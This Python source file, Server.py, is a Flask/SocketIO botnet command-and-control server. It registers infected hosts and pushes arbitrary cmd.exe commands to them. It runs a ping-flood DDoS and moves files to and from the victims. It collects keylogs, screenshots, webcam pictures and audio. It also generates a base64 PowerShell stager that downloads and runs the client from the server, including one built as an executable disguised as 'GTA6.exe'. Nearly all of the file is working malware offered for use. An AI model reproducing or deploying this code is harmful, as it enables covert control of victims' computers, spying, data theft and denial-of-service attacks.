#Server.py

from flask import Flask, request, render_template, redirect, url_for, session, jsonify
from flask_socketio import SocketIO, emit
import os.path, subprocess, base64, sqlite3, threading

MAX_BUFFER_SIZE = 50 * 1000 * 1000
app = Flask(__name__)
server = SocketIO(app, max_http_buffer_size=MAX_BUFFER_SIZE)
app.secret_key = 'Fixer'

events = sqlite3.connect("Events.db")
if not os.path.exists("Events.db"):
    events.execute("Create table Bots (bot_id INT AUTO_INCREMENT PRIMARY KEY, hostname VARCHAR(50), ip_address VARCHAR(15), os VRACHAR(50), status VARCHAR(5))")
    events.execute("Create table Modules (bot_id INT PRIMARY KEY, hostname VARCHAR(50), command VRACHAR(80), status VARCHAR(150))")
    events.execute("Create table Commands (bot_id INT PRIMARY KEY, hostname VARCHAR(50), command VRACHAR(80), output VARCHAR(20))")
    events.execute("Create table DDOS_Attacks (serial_no INT AUTO_INCREMENT PRIMARY KEY, target VRACHAR(15))")
    events.execute("Create table File_Transfer (bot_id INT PRIMARY KEY, hostname VARCHAR(50), transfer_type VRACHAR(80), filename VARCHAR(350), status VARCHAR(250))")
    events.execute("Create table Payloads (serial_no INT AUTO_INCREMENT PRIMARY KEY, server_ip VARCHAR(15), port VARCHAR(5), force_convert VARCHAR(5))")

USERNAME = 'admin'
PASSWORD = 'admin9876'
server_ip = '0.0.0.0'
server_port = 8000

idNumber = 0
database = []
completedTasks = []
command_output = 'Now when you will again send any command you will see the output of previous command'
ping_output_list = []
file_transfer_list = []

class Client:
    def __init__(self, info):
        global idNumber
        self.idNumber = idNumber
        idNumber += 1
        self.persistence = False
        self.IP = info['IP']
        self.hostname = info['hostname']
        self.OS = info['OS']
        self.sid = info['sid']
        self.status = "Alive"

@app.route('/')
def redirectLogin():
    return redirect(url_for('login'))

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form.get('userid')
        password = request.form.get('passid')
        if username == USERNAME and password == PASSWORD:
            session['loggedin'] = True
            session['username'] = USERNAME
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html')
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if session.get('loggedin'):
        return render_template('dashboard.html', database=database)
    return redirect(url_for('login'))

@app.route('/payload', methods=['GET'])
def payload():
    payload_ip = request.args.get('serverIP')
    payload_port = request.args.get('port')
    force_convert = request.args.get('forceConvert', False)
    eventlogger_special = threading.Thread(target=eventlog_for_payload, args=(payload_ip, payload_port, force_convert))
    eventlogger_special.start()
    if force_convert != 'on':
        initial_string = rf'$url = "http://{payload_ip}:{payload_port}/Client.py"; $destination = "C:\Program Files\WindowsPowerShell\Malware.py"; Invoke-WebRequest -Uri $url -OutFile $destination; Start-Process -FilePath $destination'
        payload_string = base64.b64encode(initial_string.encode()).decode()
        return render_template('payload.html', string=payload_string)
    else:
        status = pytoexe()
        if status:
            initial_string = rf'$url = "http://{payload_ip}:{payload_port}/build/GTA6/GTA6.exe"; $destination = "C:\Program Files\WindowsPowerShell\GTA6.exe"; Invoke-WebRequest -Uri $url -OutFile $destination; Start-Process -FilePath $destination'
            payload_string = base64.b64encode(initial_string.encode()).decode()
            return render_template('payload.html', string=payload_string)
        else:
            payload_string = 'Pyinstaller Could not convert the \"Client.py\" Python File to an Executable File'
            return render_template('payload.html', string=payload_string)

def pytoexe():
    command = ['pyinstaller', '--name', 'GTA6', '--icon=./static/GTA6.ico', '--distpath=build/dist', 'Client.py']
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.communicate()
    if process.returncode == 0:
        return True
    else:
        return False

def eventlog_for_payload(payload_ip, payload_port, force_convert):
    events = sqlite3.connect("Events.db")
    insert = f'''insert into Payloads (server_ip, port, force_convert) VALUES ("{payload_ip}", "{payload_port}", "{force_convert}")'''
    events.execute(insert)
    events.commit()
    events.close()

@app.route('/modules', methods=['GET', 'POST'])
def modules():
    if not session.get('loggedin'):
        return redirect(url_for('login'))
    if request.method == 'POST':
        idNumber = request.form.get('idNumber')
        command = request.form.get('command')

        if idNumber:
            client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
            if client_info:
                hostname = client_info.hostname
            else:
                return "ERROR: BOT with Provided BOT-ID not Found"
            server.emit('module', {'idNumber': idNumber, 'command': command, 'hostname': hostname})
            return render_template('modules.html', tasks=completedTasks)
        else:
            return "ERROR : Bot ID not provided"

    return render_template('modules.html', tasks=completedTasks)

@server.on('module_output')
def handle_modules_output(module_output):
    idNumber = module_output.get('idNumber')
    command = module_output.get('command')
    hostname = module_output.get('hostname')
    status = module_output.get('result')
    completedTasks.append({'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': status})
    events = sqlite3.connect("Events.db")
    insert = f'''insert into Modules (bot_id, hostname, command, status) VALUES ("{idNumber}", "{hostname}", "{command}", "{status}")'''
    events.execute(insert)
    events.commit()
    events.close()

@app.route('/commands', methods=['GET'])
def commands():
    if not session.get('loggedin'):
        return redirect(url_for('login'))
    idNumber = request.args.get('idNumber')
    cmd = request.args.get('command')
    if idNumber and cmd:
        client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
        if client_info:
            hostname = client_info.hostname
            command = f"cmd.exe /C {cmd}"
            server.emit('commands', {'idNumber': idNumber, 'command': command, 'hostname': hostname})
            global command_output
            return render_template('commands.html', output=command_output)
        else:
            return jsonify({'ERROR': 'BOT with provided BOT-ID not found'}), 404
    else:
        issue = "This page has an ISSUE of Output delay for real-time debugging."
        return render_template('commands.html', output=issue)

@server.on('commands_output')
def handle_commands_output(output):
    global command_output
    idNumber = output.get('idNumber')
    hostname = output.get('hostname')
    command = output.get('command')
    command_output = output.get('output')
    events = sqlite3.connect("Events.db")
    insert = f'''insert into Commands (bot_id, hostname, command, output) VALUES ("{idNumber}", "{hostname}", "{command}", "RECEIVED / FAILED")'''
    events.execute(insert)
    events.commit()
    events.close()

@app.route('/ping', methods=['GET'])
def ping():
    ip_address = request.args.get('target')
    if ip_address:
        send_ping(ip_address)
        global ping_output_list
        return render_template('ping.html', output=ping_output_list)
    return render_template('ping.html')

def send_ping(ip_address):
    for client in database:
        idNumber = client.idNumber
        command = f'ping {ip_address} -t -l 65500'
        server.emit('ping', {'idNumber': idNumber, 'ip_address' : ip_address, 'command': command})

@server.on('ping_output')
def handle_ping_output(ping_output):
    idNumber = ping_output.get('idNumber')
    target = ping_output.get('target')
    output = ping_output.get('output')
    client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
    if client_info:
        hostname = client_info.hostname
        ping_output_list.append({'idNumber': idNumber, 'hostname': hostname, 'target': target, 'output': output})
        events = sqlite3.connect("Events.db")
        insert = f'''insert into DDOS_Attacks (target) VALUES ("{target}")'''
        events.execute(insert)
        events.commit()
        events.close()

@app.route('/file_transfer', methods=['GET'])
def file_transfer():
    if not session.get('loggedin'):
        return redirect(url_for('login'))
    
    transfer_type = request.args.get('transferType')
    idNumber = request.args.get('idNumber')
    file_name = request.args.get('fileName')
    if idNumber is not None:
        client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
        if client_info:
            hostname = client_info.hostname
    if transfer_type == 'upload':
        with open(f'{file_name}', 'rb') as file:
            file_data = file.read()
            server.emit('upload', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
        return render_template('file_transfer.html', transfer=file_transfer_list)
    elif transfer_type == 'download':
        server.emit('download', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name})
        return render_template('file_transfer.html', transfer=file_transfer_list)
    return render_template('file_transfer.html', transfer=file_transfer_list)

@server.on('file_status')
def file_status_update(file_status):
    idNumber = file_status.get('idNumber')
    transfer_type = file_status.get('transfer_type')
    hostname = file_status.get('hostname')
    file_name = file_status.get('file_name')
    status = file_status.get('status')
    file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
    events = sqlite3.connect("Events.db")
    insert = f'''insert into File_Transfer (bot_id, hostname, transfer_type, filename, status) VALUES ("{idNumber}", "{hostname}", "{transfer_type}", "{file_name}", "{status}")'''
    events.execute(insert)
    events.commit()
    events.close()

@server.on('download_from_client')
def download(input):
    idNumber = input.get('idNumber')
    transfer_type = input.get('transfer_type')
    hostname = input.get('hostname')
    file_name = input.get('file_name')
    file_data = input.get('file_data')
    file_path = "./Data/Files/" + file_name
    if transfer_type == 'download':
        try:
            with open(file_path, 'wb') as file:
                file.write(file_data)
                status = "File Has Been Downloaded SuccessFully from the Client"
                file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
        except:
            status = "File Could not be Written on the Server"
            file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})

@server.on('module_file')
def module_file_transfer(input):
    command = input.get('command')
    file_name = input.get('file_name')
    file_data = input.get('file_data')
    if command == 'screenshot':
        file_path = "./Data/Screenshots/" + file_name
        with open(file_path, 'wb') as file:
            file.write(file_data)
    elif command == 'picture':
        file_path = "./Data/Pictures/" + file_name
        with open(file_path, 'wb') as file:
            file.write(file_data)
    elif command == 'audio':
        file_path = "./Data/Audios/" + file_name
        with open(file_path, 'wb') as file:
            file.write(file_data)

@server.on('keylogs')
def keylogs_saver(input):
    hostname = input.get('hostname')
    key = input.get('key')
    filename = f"./Data/Keylogs/{hostname}_keylogs.txt"
    if not os.path.exists(filename):
        open(filename, 'a+').close()
    if key is not None:
        with open(filename, 'a') as logkey:
            logkey.write(key)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@server.on('connect')
def onConnect():
    pass

@server.on('disconnect')
def onDisconnect():
    pass

@server.on('Initial_Information')
def handleInformation(Initial_Information):
    server.emit('idNumber', {'idNumber': idNumber})
    database.append(Client(Initial_Information))
    hostname = Initial_Information.get("hostname")
    operating_system = Initial_Information.get("OS")
    ip = Initial_Information.get("IP")
    events = sqlite3.connect("Events.db")
    insert = f'''insert into Bots (hostname, ip_address, os, status) VALUES ("{hostname}", "{ip}", "{operating_system}", "Alive")'''
    events.execute(insert)
    events.commit()
    events.close()

if __name__ == '__main__':
    server.run(app, host=server_ip, port=server_port)
